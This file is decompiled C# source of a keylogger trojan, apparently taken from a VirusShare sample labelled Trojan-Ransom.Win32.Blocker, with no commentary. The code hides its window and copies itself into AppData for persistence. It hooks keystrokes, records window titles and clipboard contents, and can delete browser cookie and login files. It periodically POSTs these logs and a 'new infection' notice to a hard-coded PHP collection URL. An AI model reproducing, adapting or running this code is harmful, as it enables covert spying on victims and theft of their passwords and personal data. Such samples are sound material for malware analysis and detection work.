// Decompiled with JetBrains decompiler
// Type: Class1
// Assembly: hftest2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 166C1B4F-D0F7-47DE-B33F-D21A7D4EBF57
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aqnj-e678e94b783567a135b80db00da9a1d240f24b467af5017cb420df61648a56c5.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class1
{
  [AccessedThroughProperty("kbHook")]
  private static KeyboardHook _kbHook;
  private static string s;
  private static string crypt;
  private static int userTime;
  private static string mutexa;
  private static string phpLink;
  private static bool asup;
  private static bool clearHist;
  private static string specChars;
  private static string secondaryChars;
  private static string secondaryCharsShift;
  private static string otherChars;
  private static string otherCharsShift;
  private static WebClient client;
  private static string winName;
  private static bool isText;
  private static Mutex objMutex;

  static Class1()
  {
    Class1.kbHook = new KeyboardHook();
    Class1.s = "";
    Class1.crypt = "XCPcCLzXWK8Ru2gdR";
    Class1.userTime = 5;
    Class1.mutexa = "XCPcCLzXWK8Ru2gdRi7ZgCBusQIULw";
    Class1.phpLink = "http://znnet.zxq.net/logs/froghost.php";
    Class1.asup = false;
    Class1.clearHist = false;
    Class1.specChars = ")!@#$%^&*(";
    Class1.secondaryChars = "[\\]'";
    Class1.secondaryCharsShift = "{|}\"";
    Class1.otherChars = ";=,-.";
    Class1.otherCharsShift = ":+<->";
    Class1.client = new WebClient();
    Class1.winName = (string) null;
    Class1.isText = false;
  }

  private static KeyboardHook kbHook
  {
    get => Class1._kbHook;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      KeyboardHook.KeyDownEventHandler downEventHandler = new KeyboardHook.KeyDownEventHandler(Class1.kbHook_KeyDown);
      if (Class1._kbHook != null)
        KeyboardHook.KeyDown -= downEventHandler;
      Class1._kbHook = value;
      if (Class1._kbHook == null)
        return;
      KeyboardHook.KeyDown += downEventHandler;
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
  public static void Main()
  {
    Form mainForm = new Form()
    {
      Text = "Test!",
      Size = new Size(0, 0),
      WindowState = FormWindowState.Minimized,
      ShowInTaskbar = false,
      Opacity = 0.0
    };
    System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
    timer.Interval = checked (Class1.userTime * 1000 * 60);
    timer.Tick += (EventHandler) ((a0, a1) => Class1.tSave_Tick());
    timer.Start();
    Class1.objMutex = new Mutex(false, Class1.mutexa);
    if (!Class1.objMutex.WaitOne(0, false))
    {
      Class1.objMutex.Close();
      Class1.objMutex = (Mutex) null;
      ProjectData.EndApp();
    }
    try
    {
      System.IO.File.Delete(Application.ExecutablePath + ":Zone.Identifier");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    RegistryKey currentUser = Registry.CurrentUser;
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Path.GetFileName(Application.ExecutablePath);
    RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    if (!System.IO.File.Exists(str1))
    {
      System.IO.File.Copy(Application.ExecutablePath, str1);
      Class1.sendNotify();
    }
    if (Operators.CompareString(Application.ExecutablePath, str1, false) != 0)
    {
      Process.Start(str1);
      ProjectData.EndApp();
    }
    if (Class1.asup)
    {
      if (registryKey.GetValue("essential") == null)
        registryKey.SetValue("essential", (object) ("\"" + str1 + "\""));
      else if (Operators.CompareString(registryKey.GetValue("essential").ToString(), str1, false) != 0)
        registryKey.SetValue("essential", (object) ("\"" + str1 + "\""));
    }
    if (Class1.clearHist)
    {
      try
      {
        currentUser.DeleteSubKeyTree("Software\\Microsoft\\Internet Explorer\\IntelliForms");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      currentUser.Close();
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default";
      try
      {
        System.IO.File.Delete(str2 + "\\Web Data");
        System.IO.File.Delete(str2 + "\\Login Data");
        System.IO.File.Delete(str2 + "\\Cookies");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
      try
      {
        string[] directories = Directory.GetDirectories(path);
        int length = directories.Length;
        int index = 0;
        while (index <= length)
        {
          System.IO.File.Delete(directories[index] + "\\cookies.sqlite");
          System.IO.File.Delete(directories[index] + "\\key3.db");
          System.IO.File.Delete(directories[index] + "\\formhistory.sqlite");
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    Application.Run(mainForm);
    mainForm.Hide();
  }

  private static void kbHook_KeyDown(Keys Key)
  {
    if (MyProject.Computer.Keyboard.CtrlKeyDown | MyProject.Computer.Keyboard.AltKeyDown)
      return;
    if (Operators.CompareString(Class1.winName, Class1.GetActiveWindowTitle(), false) != 0 & Operators.CompareString(Class1.GetActiveWindowTitle(), "", false) != 0 & Operators.CompareString(Class1.GetActiveWindowTitle(), "Start", false) != 0 & Operators.CompareString(Class1.GetActiveWindowTitle(), "Program Manager", false) != 0)
    {
      DateTime now = DateTime.Now;
      string[] strArray = Class1.s.Split('\r');
      if (Class1.isText & Operators.CompareString(strArray[checked (strArray.Length - 1)].Trim().Replace("\r\n", ""), "", false) != 0)
      {
        Class1.s += "\r\n";
        Class1.isText = false;
      }
      Class1.s = Class1.s + "\r\n----[ " + Class1.GetActiveWindowTitle() + " - " + now.ToString("hh:mm:ss tt") + " ]----\r\n";
      Class1.winName = Class1.GetActiveWindowTitle();
    }
    switch (Key)
    {
      case Keys.Back:
        Class1.s += "<BKSPC>";
        break;
      case Keys.Return:
        string[] strArray1 = Class1.s.Split('\r');
        if (Operators.CompareString(strArray1[checked (strArray1.Length - 1)].Trim().Replace("\r\n", ""), "", false) == 0)
          break;
        Class1.s += "\r\n";
        break;
      case Keys.Space:
        Class1.s += " ";
        break;
      default:
        if (Key > (Keys) 64 & Key < Keys.LWin)
        {
          Class1.isText = true;
          if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
          {
            Class1.s += Key.ToString();
            break;
          }
          Class1.s += Key.ToString().ToLower();
          break;
        }
        if (Key - 48 < Keys.LineFeed & Key - 48 > (Keys.KeyCode | Keys.Modifiers))
        {
          Class1.isText = true;
          if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
          {
            Class1.s += Conversions.ToString(Class1.specChars[(int) (Key - 48)]);
            break;
          }
          Class1.s += Conversions.ToString((int) (Key - 48));
          break;
        }
        if (Key - 186 > (Keys.KeyCode | Keys.Modifiers) & Key - 186 < Keys.XButton1)
        {
          Class1.isText = true;
          if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
          {
            Class1.s += Conversions.ToString(Class1.otherCharsShift[(int) (Key - 186)]);
            break;
          }
          Class1.s += Conversions.ToString(Class1.otherChars[(int) (Key - 186)]);
          break;
        }
        if (Key - 219 > (Keys.KeyCode | Keys.Modifiers) & Key - 219 < Keys.MButton)
        {
          Class1.isText = true;
          if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
          {
            Class1.s += Conversions.ToString(Class1.secondaryCharsShift[(int) (Key - 219)]);
            break;
          }
          Class1.s += Conversions.ToString(Class1.secondaryChars[(int) (Key - 219)]);
          break;
        }
        switch (Key)
        {
          case Keys.Tab:
            Class1.isText = true;
            Class1.s += "<tab>";
            return;
          case Keys.OemQuestion:
            Class1.isText = true;
            if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
            {
              Class1.s += "?";
              return;
            }
            Class1.s += "/";
            return;
          case Keys.Oemtilde:
            Class1.isText = true;
            if (MyProject.Computer.Keyboard.ShiftKeyDown || MyProject.Computer.Keyboard.CapsLock)
            {
              Class1.s += "~";
              return;
            }
            Class1.s += "`";
            return;
          default:
            if (!(Key - 96 > (Keys.KeyCode | Keys.Modifiers) & Key - 96 < Keys.ShiftKey))
              return;
            Class1.isText = true;
            string str = "0123456789*+ -./";
            Class1.s += Conversions.ToString(str[(int) (Key - 96)]);
            return;
        }
    }
  }

  private static void tSave_Tick()
  {
    string s = Class1.s;
    Class1.s = "";
    if (Operators.CompareString(s, (string) null, false) == 0)
      return;
    string str1 = s.Replace("&", "%26");
    DateTime now = DateTime.Now;
    string str2 = "*******************************************************************\r\n" + "* [FrogLogger v0.5]\r\n" + "* LOG FILE: " + now.ToString("MM/dd/yyyy hh:mm:ss tt") + "\r\n" + "* Host name: " + MyProject.Computer.Name + "\r\n* Current User: " + Environment.UserName + "\r\n" + "* IP Address: " + Class1.GetIP() + "\r\n" + "*******************************************************************\r\n" + "Clipboard: " + Clipboard.GetText() + "\r\n\r\n";
    WebClient webClient = new WebClient();
    string str3 = MyProject.Computer.Name + " - " + now.ToString("MM-dd-yyyy hh.mm.ss tt") + ".dat";
    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
    webClient.Headers.Add("Accept-Encoding", "text/plain");
    webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9");
    string data = "name=" + str3 + "&log=" + str2 + str1;
    string method = "POST";
    string phpLink = Class1.phpLink;
    webClient.UploadString(phpLink, method, data);
  }

  public static void sendNotify()
  {
    string str1 = "*******************************************************************\r\n" + "* [FrogLogger v0.5]\r\n" + "* NEW INFECTION NOTIFICATION: " + DateTime.Now.ToString("MM/dd/yyyy hh:mm:ss tt") + "\r\n" + "* Host name: " + MyProject.Computer.Name + "\r\n* Current User: " + Environment.UserName + "\r\n" + "* IP Address: " + Class1.GetIP() + "\r\n" + "*******************************************************************\r\n";
    WebClient webClient = new WebClient();
    string str2 = "NEW INFECTION - " + MyProject.Computer.Name;
    webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
    webClient.Headers.Add("Accept-Encoding", "text/plain");
    webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Iron/4.0.280.0 Chrome/4.0.280.0 Safari/532.9");
    string data = "name=" + str2 + "&log=" + str1;
    string method = "POST";
    string phpLink = Class1.phpLink;
    webClient.UploadString(phpLink, method, data);
  }

  public static string GetIP() => new StreamReader(((HttpWebResponse) ((HttpWebRequest) WebRequest.Create("http://automation.whatismyip.com/n09230945.asp")).GetResponse()).GetResponseStream()).ReadToEnd();

  private static string GetActiveWindowTitle()
  {
    string lpString = new string(char.MinValue, 100);
    Class1.GetWindowText(Class1.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }
}
